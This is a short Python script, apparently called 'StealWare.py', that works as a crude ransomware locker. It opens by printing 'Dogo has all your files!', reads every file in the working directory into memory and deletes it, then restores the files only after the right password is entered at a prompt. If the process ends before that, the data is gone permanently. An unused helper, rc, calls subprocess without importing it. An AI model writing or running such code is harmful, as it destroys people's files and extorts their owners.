print("Dogo has all your files!")
import os

class Utilities:
    @staticmethod
    def View_File(file):
        with open(file, 'r') as file_handle:
            content = file_handle.read()
        return content

    @staticmethod
    def Create_File(filename, new_content):
        with open(filename, 'w') as file_handle:
            file_handle.write(new_content)
        return "Executed"
    @staticmethod
    def Del(file):
        os.remove(file)
def rc(command):
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(result)
# Example usage:
Files = [item for item in os.listdir() if os.path.isfile(item)]
Data = []
utility_instance = Utilities()

# Create a list of files to process, excluding "StealWare.py"
files_to_process = [file for file in Files if file != "StealWare.py"]

for file in files_to_process:
    Data.append(utility_instance.View_File(file))
    print(f"Processing file: {file}")
    utility_instance.Del(file)

# Now, Files and Data are processed separately
correct_password = "[Your Password Here]"
while True:
    input_password = input("Password: ")
    if input_password == correct_password:
        for file, datas in zip(files_to_process, Data):
            print(f"Creating file: {file}")
            utility_instance.Create_File(file, datas)
        exit()

    if input_password != correct_password:
        print("Incorrect password.")
